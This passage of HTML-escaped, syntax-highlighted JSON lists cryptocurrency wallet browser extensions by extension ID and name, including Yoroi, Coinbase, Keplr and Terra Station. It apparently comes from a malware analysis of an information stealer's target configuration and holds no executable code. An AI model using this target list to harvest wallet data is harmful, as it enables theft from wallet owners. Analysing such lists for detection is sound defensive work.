class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;fhbohimaelbohpjbbldcngcnapndodjp&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Binance Chain Wallet&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;ffnbelfdoeiohenkjibnmadjiehjhajb&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Yoroi&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;jbdaocneiiinmjbjlgalhcelgbejmnid&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Nifty&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;afbcbjpbpfadlkmhmclhkeeodmamcflc&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Math&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;hnfanknocfeofbddgcijnmhnfnkdnaad&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Coinbase&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;hpglfhgfnhbgpjdenjgmdgoeiappafln&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Guarda&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;blnieiiffboillknjnepogjhkgnoapac&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;EQUA&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;cjelfplplebdjjenllpjcblmjkfcffne&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Jaxx Liberty&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;fihkakfobkmkjojpchpfgcmhfjnmnfpi&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;BitApp&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;kncchdigobghenbbaddojjnnaogfppfj&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;iWlt&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;kkpllkodjeloidieedojogacfhpaihoh&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;EnKrypt&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;amkmjjmmflddogmhpjloimipbofnfjih&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Wombat&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;nlbmnnijcnlegkjjpcfjclmcfggfefdm&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;MEW CX&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;nanjmdknhkinifnkgdcggcfnhdaammmj&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Guild&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;nkddgncdjgjfcddamfgcmfnlhccnimig&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Saturn&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;cphhlgmgameodnhkjdmkpanlelnlohao&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;NeoLine&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;nhnkbkgjikgcigadomkphalanndcapjk&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Clover&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;kpfopkelmapcoipemfendmdcghnegimn&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Liquality&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;aiifbnbfobpmeekipheeijimdpnlpgpp&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Terra Station&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;dmkamcknogkgcdfhhbddcghachkejeap&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Keplr&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;fhmfendgdocmcbmfikdcogofphimnkno&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Sollet&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;cnmamaachppnkjgnildpdmkaakejnhae&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Auro&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;jojhfeoedkpkglbfimdfabpdfjaoolaf&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Polymesh&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;flpiciilemghbmfalicajoolhkkenfe&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;ICONex&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;nknhiehlklippafakaeklbeglecifhad&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;ez&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Nabox&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;attr&#34;&gt;&amp;quot;en&amp;quot;&lt;/span&gt;&lt;span class=&#34;punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;hcflpincpppdclinealmandijcmnkbgn&amp;quot;&lt;/span&gt;&lt;span 